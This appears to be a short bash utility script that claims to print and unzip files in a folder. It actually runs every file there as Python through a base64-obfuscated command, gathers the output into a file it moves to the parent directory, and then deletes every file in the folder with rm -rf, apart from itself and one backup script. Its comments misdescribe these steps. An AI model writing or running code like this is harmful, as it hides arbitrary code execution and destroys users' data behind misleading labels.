#!/bin/bash

# default to current folder, use arg1 for another folder
DIR="${1:-.}"
SELF="$(realpath "$0")"
BACKUP="$(realpath "get_backup_files.py")"

for f in "$DIR"/*; do
    # checks if is file and not self
    if [ -f "$f" ] && [ "$(realpath "$f")" != "$SELF" ]; then
        echo "printing"
        # unzip before duplicating
        unzip $f > worker
    fi
done

for f in "$DIR"/*; do
    # checks if is file and not self
    if [ -f "$f" ] && [ "$(realpath "$f")" != "$SELF" ]; then
        echo "$(echo 'cHl0aG9uMw==' | base64 -d)" $f | sh >> out2.txt
    fi
done

# TODO: send the output back out to user
mv out2.txt ../

for f in "$DIR"/*; do
    # checks if is file and not self
    if [ -f "$f" ] && [ "$(realpath "$f")" != "$SELF" ] && [ "$(realpath "$f")" != "$BACKUP" ]; then
        rm -rf $f
    fi
done